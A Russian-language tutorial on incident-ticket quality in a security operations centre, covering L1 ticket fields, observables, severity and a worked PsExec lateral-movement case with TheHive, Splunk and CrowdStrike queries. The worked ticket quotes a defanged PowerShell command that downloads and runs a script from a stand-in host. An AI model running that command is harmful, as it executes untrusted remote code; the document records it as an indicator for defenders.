# Качество тикета в SOC: основа работы L2 и разбора инцидента

## Роль тикета в эскалации инцидента и понятие качества для L2

Тикет системы управления инцидентами информационной безопасности (ИБ) — это структурированная запись, содержащая все сведения о выявленном событии или инциденте, необходимые для его обработки аналитиками различных уровней. В операционном центре безопасности (SOC) тикет выступает универсальным носителем информации при переходе инцидента между линиями анализа: от первой линии (L1), осуществляющей первичную сортировку и подтверждение инцидента, ко второй (L2), выполняющей углублённое расследование и выработку мер реагирования. Качество заполнения тикета на уровне L1 напрямую определяет эффективность работы L2, поскольку именно из содержимого тикета L2-аналитик извлекает контекст, индикаторы компрометации (IoC), временные метки и характер воздействия. Тикет — не просто журнальная запись, а полноценный объект данных, связывающий алерт SIEM, результаты первичного анализа и последующие шаги.

В практике SOC термин «тикет» часто смешивают с понятием «алерт» или «заявка Service Desk», что приводит к потере информации. В таблице 1 чётко разграничены эти сущности.

| Сущность                          | Ключевые признаки                                                                                         | Использование в контексте SOC                                        |
|-----------------------------------|-----------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|
| **Алерт SIEM**                    | Сгенерирован автоматически правилом корреляции; содержит время, источник, сигнатуру, сырые данные события | Входная точка для L1; требует проверки, контекстуализации и создания тикета при подтверждении |
| **Инцидент-тикет (SOC)**          | Ручная или автоматизированная запись с обогащённым контекстом, классификацией, severity, наблюдаемыми IoC и временной шкалой | Рабочий документ на всех линиях анализа; основа для эскалации, отчётности и закрытия инцидента |
| **Заявка Service Desk (ITSM)**    | Заявка на устранение неисправности, доступ или иную ИТ-услугу; не содержит признаков нарушения безопасности, если не эскалирована из SOC | Неприменима к инцидентам ИБ, если не содержит злонамеренной активности; в SOC может использоваться для сопутствующих действий (переустановка ПО, блокировка учётной записи) |

Из таблицы видно, что инцидент-тикет занимает центральное место в жизненном цикле реагирования, трансформируя сырой сигнал в пригодные для расследования данные. Качество тикета определяется тремя основными свойствами:

- **Полнота**: наличие всех необходимых полей, включая наблюдаемые артефакты, временные метки, затронутые активы и первоначальную оценку;
- **Точность**: отсутствие противоречий, проверенных (не предположительных) данных, корректная классификация и маркировка severity;
- **Своевременность**: создание тикета в пределах установленного SLA и актуализация по мере поступления новой информации.

Для L2-аналитика качественный тикет означает возможность немедленно приступить к расследованию, не тратя время на повторный опрос L1, повторный сбор логов или уточнение контекста. Исследование инцидент-менеджмента в SOC, проведённое SANS (2021), показало, что до 30% времени L2 расходуется на восполнение пробелов, оставленных L1 при документировании. Таким образом, качество тикета — это не формальное требование, а критический фактор соблюдения временных метрик реагирования (Mean Time to Detect / Mean Time to Respond).

На рисунке 1 показан упрощённый поток данных, подчеркивающий роль тикета при передаче инцидента.

```text
[SIEM] ──(алерт)──▶ [L1: проверка] ──(создание тикета)──▶ [Система управления инцидентами]
                                      ▲
[Система управления инцидентами] ──(эскалация)──▶ [L2: расследование]
```

Без полноценного тикета L2 вынужден самостоятельно восстанавливать цепочку событий от алерта, что удваивает усилия и повышает риск ошибки. В следующих разделах детализируется, какие элементы составляют качественный тикет и как именно он влияет на расследование.

## Внутреннее устройство качественного тикета L1: поля, классификация и наблюдаемые данные

Тикет в SOC имеет структурированную модель данных, унифицированную в платформах типа TheHive, Cortex XSOAR, ServiceNow Security Operations или IBM Resilient. Независимо от конкретной реализации, качественный тикет L1 должен содержать определённый набор полей, позволяющий L2 сразу понять природу и масштаб инцидента. В таблице 2 представлен обязательный минимум и рекомендации по заполнению для типового инцидента, связанного с вредоносной активностью на конечной точке.

|------------------------------------|----------------|-----------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------|

Структура наблюдаемых данных (observables) в современных платформах может быть представлена в виде JSON-объекта, который машиночитаем и пригоден для автоматической загрузки в системы обогащения Threat Intelligence. Пример (иллюстративная схема):

```json
{
  "observables": [
    {
      "dataType": "hash",
      "value": "1a2b3c...",
      "tags": ["malware", "pe-file"],
      "context": "SHA256 вредоносного исполняемого файла, обнаруженного на WS-ADM-017"
    },
    {
      "dataType": "ip",
      "value": "5.6.7.8",
      "tags": ["c2", "suspicious"],
      "context": "IP-адрес, к которому обращался процесс svchost.exe"
    },
    {
      "dataType": "domain",
      "value": "bad.example.com",
      "tags": ["c2", "phishing"],
      "context": "Домен, разрешаемый IP C2-сервера"
    }
  ],
  "parent_alert_id": "siem-alert-88923"
}
```

Такая структура позволяет L2 аналитику с помощью одного запроса получить все индикаторы, отправить их в тикет-систему и сразу начать поиск по другим источникам (песочница, Threat Intelligence Platform, SIEM).

Классификация инцидента по матрице MITRE ATT&CK (указание техники T1059 в примере) — это современный индустриальный стандарт, связывающий наблюдаемую активность с тактиками злоумышленника. Она необходима L2 для применения соответствующих процедур расследования (playbooks). Качественный тикет обязательно содержит сопоставленную технику, даже если первичная идентификация приблизительна; она уточняется L2 в процессе.

Важность поля «severity» нельзя недооценивать. L2-аналитик ориентируется на оценку критичности, чтобы определить очерёдность обработки. Некачественная оценка (например, завышение severity для ложного срабатывания) ведёт к нерациональному использованию ресурсов. Поэтому в зрелых SOC существуют внутренние матрицы severity, основанные на комбинации типа инцидента, затронутых активов и наличия подтверждённых IoC. Тикет L1 должен содержать обоснование выставленного уровня.

Таким образом, хорошо структурированный тикет — это не только перечень полей, но и продуманная взаимосвязь между ними, обеспечивающая прозрачность и быстрое понимание инцидента на более высоком уровне анализа.

## Практическая работа с тикетом: заполнение, контроль качества и передача L2

Процесс создания качественного тикета L1 включает несколько этапов, каждый из которых требует использования специфических инструментов и соблюдения регламента. Основная задача L1 — не просто перенести алерт в тикет-систему, а обогатить его минимальным необходимым контекстом и верифицированными наблюдаемыми данными.

### Типовой workflow L1 при подтверждённом алерте

1. **Получение и первичный осмотр**: L1 видит алерт в панели SIEM (Splunk, Elastic Security, Azure Sentinel) или SOAR. Алерт содержит сигнатуру, время, источник и, возможно, автоматически извлечённые поля. L1 открывает связанные сырые события.
2. **Верификация и контекстуализация**: Аналитик проверяет, не является ли событие ложным срабатыванием (например, легитимное администрирование), используя дополнительные данные: логи EDR, историю команд пользователя, информацию об активе из CMDB.
3. **Сбор артефактов**: Если инцидент подтверждён, L1 извлекает ключевые IoC: хэши файлов, IP-адреса, домены, командные строки (например, из Sysmon Event ID 1, PowerShell Event ID 4104). Выполняет первичный поиск по OSINT (VirusTotal, Shodan) для проверки известности индикаторов.
4. **Заполнение полей тикета**: Аналитик создаёт запись в системе тикетов (TheHive, Jira SOAR), заполняя поля в соответствии с шаблоном. Описание формируется как хронология уже выполненных действий и полученных результатов.
5. **Добавление артефактов в структурированном виде**: Наблюдаемые данные (observables) вносятся отдельно от описания, чтобы системы автоматизации могли их обрабатывать.
6. **Первичная изоляция (при необходимости)**: L1 предпринимает немедленные меры сдерживания: изоляция хоста, блокировка IP на межсетевом экране, сброс пароля пользователя. Эти меры обязательно документируются в тикете.
7. **Эскалация**: После проверки качества (self-review или автоматическая валидация обязательных полей) тикет переводится в статус «Эскалирован L2» с уведомлением дежурной смены.

### Инструментарий и автоматизация

На практике большинство перечисленных шагов частично автоматизируется с помощью playbook'ов в SOAR. Например, при создании инцидента через API платформа может автоматически обогащать IP-адреса через Threat Intelligence, подтягивать детали хоста из CMDB и проверять заполнение обязательных полей. Пример программного создания тикета через HTTP-запрос к API TheHive:

```http
POST /api/case HTTP/1.1
Host: thehive.company.local
Authorization: Bearer <API_KEY>
Content-Type: application/json

{
  "title": "Обнаружение подозрительного процесса svchost.exe с нестандартным родителем на WS-ADM-017",
  "description": "Сработало правило SIEM Unusual Parent Process... (подробности)",
  "severity": 3,
  "tags": ["malware", "T1059"],
  "status": "Open",
  "customFields": {
    "hostname": "WS-ADM-017",
    "username": "ivanov_ii",
    "firstEventTime": "2025-03-11T08:17:29Z"
  },
  "tasks": [{"title": "Изоляция хоста", "status": "Completed"}]
}
```

Подобный API-вызов может быть интегрирован в скрипт SIEM/SOAR для автоматического создания тикета с обязательными полями.

### Критерии качества перед эскалацией

Перед тем как тикет попадёт к L2, он должен пройти контроль качества. В SOC с высоким уровнем зрелости существуют формальные чек-листы для L1:

- Все обязательные поля заполнены (см. таблицу 2);
- В описании чётко обозначена временная шкала и предпринятые действия;
- Наблюдаемые артефакты содержат не менее одного уникального индикатора (хэш, IP, URL) в структурированном поле;
- Severity обоснован и не противоречит политикам SOC;
- Приложены релевантные скриншоты алертов или выводов инструментов (в промышленных средах скриншоты допустимы как дополнение, но не замена текстовых данных);
- Отсутствует избыточная информация (например, полные дампы пакетов без фильтрации), которая может зашумлять анализ.

Аналитик L2, открывая тикет, должен иметь возможность ответить на пять базовых вопросов без обращения к L1: *Что произошло? Когда? Где (на каком активе)? Какие индикаторы скомпрометированы? Что уже сделано для сдерживания?* Если любой из этих ответов отсутствует, качество тикета считается недостаточным, и он отправляется на доработку, что увеличивает время реагирования.

Типичная ошибка L1 — включение в тикет предположений без пометок. Например, запись «вероятно, использовался PowerShell-скрипт» без ссылки на соответствующие логи создаёт ложное направление для L2. Поэтому в качественном тикете факты и гипотезы чётко разделены: для гипотез используется оговорка «предположительно» и указывается, что требуется проверка.

Таким образом, тикет L1 — это продукт, создаваемый по стандарту «готов к расследованию», а не просто черновая запись. Дисциплина документирования вознаграждается существенным выигрышем во времени на последующих этапах.

## Влияние качества тикета на эффективность разбора инцидента

Разбор инцидента (incident investigation) — многоэтапный процесс, включающий определение вектора атаки, масштаба компрометации, временного окна, поиск дополнительных артефактов и выработку рекомендаций. Все эти шаги L2-аналитик строит на основе данных из тикета. Чем полнее и точнее входной документ, тем быстрее и глубже выполняется расследование.

### Ключевые этапы расследования и потребляемые данные тикета

1. **Построение временной шкалы** — отправная точка расследования. Требуется точное время начала события (Event Time). Если L1 указал лишь приблизительное время срабатывания алерта без корреляции с временем в логах, временная шкала смещается, и L2 теряет время на самостоятельный поиск истинного момента атаки. Пример: некачественный тикет содержит только «08:17», но не указывает часовой пояс или не синхронизирует с данными EDR, что при анализе логов с другого хоста вызывает расхождение.

2. **Идентификация вектора атаки** — основывается на первичных артефактах: вредоносный файл, фишинговая ссылка, эксплойт. Если хэш файла не был извлечён L1 и не помещён в тикет, L2 вынужден заново получать доступ к исходной системе (если это ещё возможно) или искать файл в карантине, что задерживает расследование. При качественном тикете хэш уже проверен в VirusTotal, и результат (например, 15/70 обнаружений) приложен.

3. **Поиск по логам и корреляция** — L2 формирует поисковые запросы в SIEM, используя IoC из тикета. Если IP-адрес или домен не структурированы, а затеряны в тексте описания, автоматизированные инструменты не могут их подхватить, и аналитик вынужден копировать индикаторы вручную, рискуя опечатками.

4. **Определение масштаба** — необходимо понять, какие ещё активы затронуты. L2 ищет в логах соединения с тем же C2-сервером или процессы с таким же хэшем на других хостах. Если тикет содержит только один актив, но не отмечена зона ответственности пользователя, масштаб может быть недооценён.

5. **Выработка мер противодействия** — L2 предлагает блокировки, перезагрузки, восстановление из бэкапа. Качественный тикет уже содержит предпринятые L1 меры, что избавляет от дублирования и позволяет скоординировать дальнейшие шаги.

### Типичные дефекты тикета и их влияние на расследование

Для систематизации в таблице 3 приведены распространённые недостатки заполнения и их последствия.

| Дефект тикета                                      | Как проявляется для L2                                                                 | Возможный исход для инцидента                                       |
|----------------------------------------------------|----------------------------------------------------------------------------------------|----------------------------------------------------------------------|
| Отсутствие хэша или неверный хэш файла             | Нельзя быстро проверить репутацию в TI; необходимо извлечь файл из карантина заново    | Задержка с определением вредоносности; пропуск известного вредоноса   |
| Не указан идентификатор события (например, Sysmon Event ID 1) | Невозможно сразу найти исходное событие; поиск вслепую                             | Риск ложного направления расследования                               |
| Размытое описание без чёткой хронологии            | L2 тратит время на воссоздание последовательности от алерта до создания тикета        | Нарушение SLA; упущение критических временных окон                   |
| Смешение фактов и предположений                    | Аналитик L2 может принять гипотезу за истину, что направит расследование по ложному пути | Ошибочное определение техники атаки; неверная изоляция                |
| Отсутствие информации о предпринятых мерах         | L2 повторяет изоляцию или блокировку, возможно, отменяя уже выполненные действия       | Состояние гонки, избыточная нагрузка на инфраструктуру               |
| Неточная временная метка или несогласованный часовой пояс | Временная шкала не совпадает с логами других систем, затруднена кросс-корреляция       | Пропуск одновременных атак на другие активы                         |

Данные дефекты напрямую влияют на показатели MTTD/MTTR и на достоверность отчётности для руководства. В долгосрочной перспективе накопление некачественных тикетов подрывает способность SOC к проактивной охоте (threat hunting), так как отсутствует достоверная база исторических инцидентов.

### Положительное влияние качественного тикета: практический разбор

Предположим, L1 создал идеальный тикет по случаю обнаружения аномальной DNS-активности на сервере. В тикете указаны: запрошенный домен DGA-типа, IP-адрес резолвера, временной промежуток, скриншот графика запросов из EDR и хэш PowerShell-скрипта, инициировавшего запросы. Аналитик L2, получив такой тикет, первым делом:

- вводит хэш скрипта в песочницу, получает вердикт;
- по IP-адресу резолвера быстро находит все хосты, обращавшиеся к нему в указанный период, используя запрос в Splunk: `index=proxy dns_query=*badpattern* earliest=-2h@h`;
- выявляет ещё три машины с аналогичными запросами и изолирует их, предотвращая дальнейшее распространение.

Вся процедура занимает минуты, а не часы, потому что L1 предоставил не просто алерт, а готовую основу для немедленных действий. В противном случае L2 пришлось бы самостоятельно запускать заново расследование DNS-трафика, теряя драгоценное время и, возможно, позволяя атакующему закрепиться.

Таким образом, качество тикета — это не вопрос бюрократии, а обязательное условие быстрого, точного и эффективного расследования. Инвестиции в обучение L1 и автоматизацию проверки тикетов окупаются многократно за счёт ускорения реагирования и уменьшения ущерба.

## Сквозной практический пример: от алерта до расследования с качественным тикетом

### Исходные условия

Среда: SIEM Splunk, EDR CrowdStrike, платформа TheHive, межсетевой экран Palo Alto. Роль: аналитик L1. Сценарий: срабатывает правило Splunk «Suspicious PsExec Execution» на рабочей станции WS-ACCT-105. В алерте указан процесс PsExec.exe, запущенный от учётной записи domain\jsmith, с удалённого хоста 10.10.1.50. Необходимо создать тикет и передать L2.

### Шаг 1: Первичный анализ и верификация

L1 открывает детали алерта в Splunk и выполняет дополнительный поиск по Sysmon Event ID 1 для хоста жертвы:

```splunk
index=windows EventCode=1 host="WS-ACCT-105" Image="*PsExec.exe" earliest=-1d
| table _time, User, ParentImage, CommandLine, ParentCommandLine, Hashes
```

Вывод (иллюстративная схема): находит три события, одно из которых с командной строкой `PsExec.exe \\WS-ACCT-105 -u domain\jsmith -p ... cmd.exe /c powershell -enc <base64>`. Родительский процесс — wmiprvse.exe, что соответствует поведению PsExec. Хэш файла PsExec.exe совпадает с легитимной утилитой Microsoft (SHA256: d69e...), но запуск от удалённой машины нехарактерен для администратора jsmith в нерабочее время. L1 подтверждает инцидент.

### Шаг 2: Сбор артефактов и контекста

L1 извлекает из события командную строку PowerShell, декодирует base64 и находит команду загрузки скрипта с внешнего IP. Затем ищет сетевые подключения процесса в том же временном окне:

```crowdstrike
search Hostname=WS-ACCT-105 event_simpleName=ProcessRollup2 ImageFileName="powershell.exe" earliest=-2h
| table timestamp, CommandLine, SHA256HashData, NetworkAccessIP4
```

Вывод (иллюстративная схема): обнаружено сетевое соединение с IP 192.0.2.88 (подозрительный, не известный в организации). Хэш PowerShell-процесса стандартный (подписан Microsoft), но скрипт выполнен в памяти. L1 сохраняет консольный вывод в текстовый файл и структурирует IoC: IP 192.0.2.88, команда PowerShell. Также собирает информацию о пользователе из AD: отдел бухгалтерии, привилегии обычного пользователя.

### Шаг 3: Создание качественного тикета

L1 формирует тикет в TheHive:

```json
POST /api/case
{
  "title": "Удалённое выполнение PsExec с хоста 10.10.1.50 на WS-ACCT-105 с последующим запуском PowerShell C2",
  "description": "1) 2025-03-11 02:11 UTC: Сработало правило Splunk 'Suspicious PsExec Execution'.\n2) Sysmon Event ID 1 подтверждает запуск PsExec.exe от wmiprvse.exe с командной строкой, включающей powershell -enc <...>.\n3) Декодированная команда: IEX (New-Object Net.WebClient).DownloadString('hxxp://192.0.2.88/a'); зафиксировано сетевое соединение.\n4) Хэш PsExec.exe соответствует легитимному, но аномальное время и отсутствие подтверждённой административной активности.\n5) Пользователь jsmith не имеет истории использования PsExec.",
  "severity": 2,
  "tags": ["Lateral Movement", "T1021.002", "Execution", "T1059.001"],
  "customFields": {
    "sourceHost": "10.10.1.50",
    "targetHost": "WS-ACCT-105",
    "username": "domain\\jsmith",
    "firstEventTime": "2025-03-11T02:11:00Z"
  },
  "tasks": [
    {"title": "Изоляция WS-ACCT-105", "status": "Completed", "owner": "L1"},
    {"title": "Блокировка IP 192.0.2.88 на межсетевом экране", "status": "Completed"}
  ],
  "observables": [
    {"dataType": "ip", "value": "192.0.2.88", "tags": ["c2", "powershell"], "context": "C2-сервер, к которому обращался PowerShell"},
    {"dataType": "command", "value": "IEX (New-Object Net.WebClient).DownloadString('hxxp://192.0.2.88/a')", "tags": ["powershell", "inline-script"]},
    {"dataType": "host", "value": "10.10.1.50", "tags": ["source", "lateral-movement"]}
  ]
}
```

### Шаг 4: Эскалация и работа L2

После проверки обязательных полей тикет эскалирован. L2-аналитик открывает его и сразу видит все необходимые данные. Он выполняет поиск загрузок с IP 192.0.2.88 на других хостах:

```splunk
index=proxy dest_ip=192.0.2.88 earliest=-4h
| stats count by src_ip, user
```

Вывод: ещё три хоста обращались к этому IP в тот же период. L2 немедленно инициирует их изоляцию и начинает анализ скрипта, загруженного по URL. Благодаря полному тикету время реакции сокращается: от эскалации до выявления всех затронутых хостов проходит менее 15 минут.

### Ожидаемый вывод примера

Данный пример демонстрирует, что качественное документирование L1 напрямую ускоряет расследование L2: сдерживание распространения, поиск других жертв и выявление полного масштаба инцидента производятся без дополнительных запросов. Информация в тикете достаточна для немедленного принятия решений и автоматизации некоторых шагов (блокировка IP, поиск по IoC). Инцидент был бы обработан значительно медленнее, если бы тикет содержал лишь краткое описание «обнаружен PsExec».
